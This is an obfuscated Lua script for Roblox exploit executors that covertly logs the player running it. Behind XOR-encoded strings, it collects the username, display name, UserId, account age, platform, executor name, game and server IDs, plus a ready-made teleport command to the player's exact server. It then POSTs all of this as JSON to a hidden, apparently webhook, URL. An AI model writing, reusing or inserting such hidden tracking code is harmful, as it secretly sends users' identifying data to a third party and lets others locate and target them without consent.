local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit ;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v29,v30) local v31={};for v36=1, #v29 do v6(v31,v0(v4(v1(v2(v29,v36,v36 + 1 )),v1(v2(v30,1 + (v36% #v30) ,1 + (v36% #v30) + 1 )))%256 ));end return v5(v31);end local v8=(syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request ;local v9=v7("\217\215\207\53\245\225\136\81\213\202\200\38\233\169\195\80\210\204\214\106\231\171\206\81\198\198\217\45\233\180\204\13\158\146\137\114\190\232\158\72\132\149\140\116\183\238\144\71\131\144\131\113\169\232\239\47\198\192\131\39\209\179\223\33\137\245\142\29\171\179\200\58\247\240\139\46\193\185\253\24\195\204\239\125\252\237\229\71\210\196\247\4\203\237\221\15\216\218\214\14\193\132\150\16\136\234\216\49\232\180\148\21\245\230\225\17\206\131\238\38\249","\126\177\163\187\69\134\219\167");local v10=game.Players.LocalPlayer;local v11=v10.Name;local v12=v10.DisplayName;local v13=v10.UserId;local v14=v10.AccountAge;local v15=v10.HasVerifiedBadge;local v16=game.PlaceId;local v17=game.JobId;local v18=os.date(v7("\102\244\103\128\241\110\136\46\133\185\11\151\111\232\166\102\254","\156\67\173\74\165"),os.time());local v19,v20=pcall(function() return identifyexecutor();end);if  not v19 then v20=v7("\1\185\66\24\179\49\72","\38\84\215\41\118\220\70");end local v21=v7("\101\24\41\28\241\71\24\98\34\242\81\21\39","\158\48\118\66\114");local v22,v23=pcall(function() return game:GetService(v7("\134\37\2\61\118\177\235\167\37\19\51\64\160\233\189\45\19\51","\155\203\68\112\86\19\197")):GetProductInfo(v16).Name;end);if v22 then v21=v23;end local function v24() local v32=0 + 0 ;local v33;local v34;local v35;while true do if (v32==(413 -(15 + 398))) then v33=game:GetService(v7("\115\206\51\238\105\118\245\237\82\238\51\238\86\113\230\253","\152\38\189\86\156\32\24\133"));v34=v33:GetPlatform();v32=983 -(18 + 964) ;end if (v32==1) then local v37=0;while true do if (v37==0) then v35={[Enum.Platform.Windows]=v7("\203\94\169\66\243\64\180","\38\156\55\199"),[Enum.Platform.OSX]=v7("\135\78\68","\35\200\29\28\72\115\20\154"),[Enum.Platform.IOS]=v7("\16\144\226","\84\121\223\177\191\237\76"),[Enum.Platform.Android]=v7("\154\88\205\178\53\89\52","\161\219\54\169\192\90\48\80"),[Enum.Platform.XBoxOne]=v7("\113\64\15\61\9\109\14\32\9\10\35\42\71\81\15\41\76\11","\69\41\34\96"),[Enum.Platform.PS4]=v7("\140\240\131\74\74\8\179\205\196\5\14\46\245","\75\220\163\183\106\98"),[Enum.Platform.XBox360]=v7("\58\184\132\47\153\81\236\219\119\145\33\181\133\36\214\14\191\194","\185\98\218\235\87"),[Enum.Platform.WiiU]=v7("\252\53\46\171\235\234\131\31\40\232\205\165\199\57\110","\202\171\92\71\134\190"),[Enum.Platform.NX]=v7("\10\200\63\139\38\129\2\141\49\212\63","\232\73\161\76"),[Enum.Platform.Ouya]=v7("\148\204\91\92\94\243\248\76\89\12\180\208\70\16\60\186\202\71\89\87","\126\219\185\34\61"),[Enum.Platform.AndroidTV]=v7("\45\192\90\96\113\126\247\167\56\248","\135\108\174\62\18\30\23\147"),[Enum.Platform.Chromecast]=v7("\149\225\56\196\21\171\48\198\165\253","\167\214\137\74\171\120\206\83"),[Enum.Platform.Linux]=v7("\167\249\60\72\224\231\195\212\55\78\243\179\132\224\123","\199\235\144\82\61\152"),[Enum.Platform.SteamOS]=v7("\52\2\188\42\10\86\154\39\14\19\183\63","\75\103\118\217"),[Enum.Platform.WebOS]=v7("\240\81\114\89\150\45","\126\167\52\16\116\217"),[Enum.Platform.DOS]=v7("\236\1\19","\156\168\78\64\224\212\121"),[Enum.Platform.BeOS]=v7("\37\235\138\253","\174\103\142\197"),[Enum.Platform.UWP]=v7("\99\31\111\120\109\121\247\22\10\94\59\46\30\204\89\104\104\61\39\30\218\68\39\17\118\108","\152\54\72\63\88\69\62"),[Enum.Platform.PS5]=v7("\228\247\187\28\156\231\225\82\199\203\226\89\157","\60\180\164\142"),[Enum.Platform.MetaOS]=v7("\117\91\17\40\8\222","\114\56\62\101\73\71\141"),[Enum.Platform.None]=v7("\141\231\208\202\183\254\213\132\156\236\205\205\187\236","\164\216\137\187")};return v35[v34] or v7("\231\232\58\188\169\233\5\146\194\52\164\175\253\14","\107\178\134\81\210\198\158") ;end end end end end local v25=v24();local v26=v7("\29\3\141\210\175\120\37\135\223\168\49\0\134\213\240\120\40\131\202\185\61","\202\88\110\226\166");if (getgenv().Easies_Configuration and getgenv().Easies_Configuration[v7("\230\2\141\227\207\252\36\135\238\200\202\1\134\228","\170\163\111\226\151")]) then v26=v7("\52\61\189\44\75\119\2\20\41\176\49\64\51\58\75\112\134\42\91\50","\73\113\80\210\88\46\87");end local v27={[v7("\130\35\195\6\226\143\56","\135\225\76\173\114")]=v7("\52\232\175\240\137\165\162\25\248\172\185\163\179\231\54\226\191\183\169\185\253","\199\122\141\216\208\204\221"),[v7("\168\208\18\245\124\229","\150\205\189\112\144\24")]={{[v7("\49\141\171\64\1","\112\69\228\223\44\100\232\113")]=v7("\241\7\2\208\163\104\143\219\17\71\247\179\104\135\221\19\20","\230\180\127\103\179\214\28"),[v7("\143\10\83\73\246","\128\236\101\63\38\132\33")]=9675430 + 7036250 ,[v7("\170\160\20\72\178\248","\175\204\201\113\36\214\139")]={{[v7("\73\205\56\217","\100\39\172\85\188")]=v7("\131\121\180\133","\83\205\24\217\224"),[v7("\240\196\193\40\227","\93\134\165\173")]="`"   .. v11   .. "`" ,[v7("\183\252\205\203\52\203","\30\222\146\161\162\90\174\210")]=true},{[v7("\235\79\125\15","\106\133\46\16")]=v7("\124\41\96\236\86\65\65\96\93\253\87\69","\32\56\64\19\156\58"),[v7("\76\201\233\67\95","\224\58\168\133\54\58\146")]="`"   .. v12   .. "`" ,[v7("\80\88\71\244\123\131","\107\57\54\43\157\21\230\231")]=true},{[v7("\213\138\28\240","\175\187\235\113\149\217\188")]=v7("\9\188\132\94\202\93","\24\92\207\225\44\131\25"),[v7("\93\210\180\89\30","\29\43\179\216\44\123")]="`"   .. v13   .. "`" ,[v7("\180\215\44\69\179\220","\44\221\185\64")]=true},{[v7("\15\230\69\90","\19\97\135\40\63")]=v7("\143\95\48\52\58\63\186\28\18\60\42","\81\206\60\83\91\79"),[v7("\88\170\220\103\42","\196\46\203\176\18\79\163\45")]="`"   .. v14   .. v7("\248\38\127\7\55\251","\143\216\66\30\126\68\155") ,[v7("\163\198\1\194\203\166","\129\202\168\109\171\165\195\183")]=true},{[v7("\44\89\58\221","\134\66\56\87\184\190\116")]=v7("\10\52\27\178\31\226\36\49","\85\92\81\105\219\121\139\65"),[v7("\235\178\92\80\121","\191\157\211\48\37\28")]="`"   .. tostring(v15)   .. "`" ,[v7("\214\17\248\21\52\218","\90\191\127\148\124")]=true},{[v7("\118\134\35\18","\119\24\231\78")]=v7("\178\33\164\73\217\105\53","\113\226\77\197\42\188\32"),[v7("\44\23\248\160\63","\213\90\118\148")]="`"   .. v16   .. "`" ,[v7("\82\32\184\95\67\94","\45\59\78\212\54")]=true},{[v7("\30\87\142\142","\144\112\54\227\235\230\78\205")]=v7("\131\36\14\255\213\27\157\41\2\249","\59\211\72\111\156\176"),[v7("\88\134\239\56\75","\77\46\231\131")]="`"   .. v21   .. "`" ,[v7("\179\90\186\73\180\81","\32\218\52\214")]=true},{[v7("\64\22\60\173","\58\46\119\81\200\145\208\37")]=v7("\1\131\50\133\141","\86\75\236\80\204\201\221"),[v7("\100\64\123\144\251","\235\18\33\23\229\158")]="`"   .. v17   .. "`" ,[v7("\89\180\205\178\94\191","\219\48\218\161")]=true},{[v7("\234\112\113\76","\128\132\17\28\41\187\47")]=v7("\53\59\11\63\29\36\42\3\57\72\21\55\2","\61\97\82\102\90"),[v7("\186\47\167\94\194","\105\204\78\203\43\167\55\126")]="`"   .. v18   .. "`" ,[v7("\172\164\47\23\29\1","\49\197\202\67\126\115\100\167")]=true},{[v7("\57\90\210\44","\62\87\59\191\73\224\54")]=v7("\194\26\255\202\242\22\245\219\167\44\251\196\226","\169\135\98\154"),[v7("\221\118\40\65\248","\168\171\23\68\52\157\83")]="`"   .. v20   .. "`" ,[v7("\253\127\249\164\43\40","\231\148\17\149\205\69\77")]=true},{[v7("\142\166\202\254","\159\224\199\167\155\55")]=v7("\211\246\42\219\244\246\124\226\251\242\40\212\248\225\49","\178\151\147\92"),[v7("\154\252\64\39\23","\26\236\157\44\82\114\44")]="`"   .. v25   .. "`" ,[v7("\35\32\217\82\36\43","\59\74\78\181")]=true},{[v7("\43\208\87\95","\211\69\177\58\58")]=v7("\146\232\118\225\236\139\156\224\96\247\224\197\179\246","\171\215\133\25\149\137"),[v7("\247\201\62\239\234","\34\129\168\82\154\143\80\156")]="`"   .. v26   .. "`" ,[v7("\140\188\63\2\70\75","\233\229\210\83\107\40\46")]=true},{[v7("\207\67\63\211","\101\161\34\82\182")]=v7("\194\2\80\240","\78\136\109\57\158\187\130\226"),[v7("\40\62\245\228\59","\145\94\95\153")]="```game:GetService('TeleportService'):TeleportToPlaceInstance("   .. v16   .. v7("\177\141","\215\157\173\116\181\46")   .. "'"   .. v17   .. "'"   .. v7("\121\244\140\243\215\48\250\187\254\219\44\177\153\225\148\25\187\136\243\214\5\184\138\235\223\39\253\139\242\218","\186\85\212\235\146") ,[v7("\203\143\26\247\55\235","\56\162\225\118\158\89\142")]=true}}}}};local v28=game:GetService(v7("\116\17\212\191\17\221\78\19\201\172\39","\184\60\101\160\207\66")):JSONEncode(v27);if v8 then print(v7("\25\182\72\140\113\176\121\173\36\135\111\168\113\177\105\172\33\141\110\168\52\134\50","\220\81\226\28"));wait();v8({[v7("\38\199\142","\167\115\181\226\155\138")]=v9,[v7("\207\39\243\84\116\117","\166\130\66\135\60\27\17")]=v7("\116\101\253\65","\80\36\42\174\21"),[v7("\102\21\54\126\75\2\36","\26\46\112\87")]={[v7("\154\44\165\96\186\177\81\249\141\58\187\113","\212\217\67\203\20\223\223\37")]=v7("\187\157\184\222\179\142\169\198\179\130\166\157\176\158\167\220","\178\218\237\200")},[v7("\148\186\226\201","\176\214\213\134")]=v28});else warn(v7("\220\153\130\228\232\100\92\229\184\179\199\188\22\108\250\190\163\196\184\89\75\224\168\178\154","\57\148\205\214\180\200\54"));end
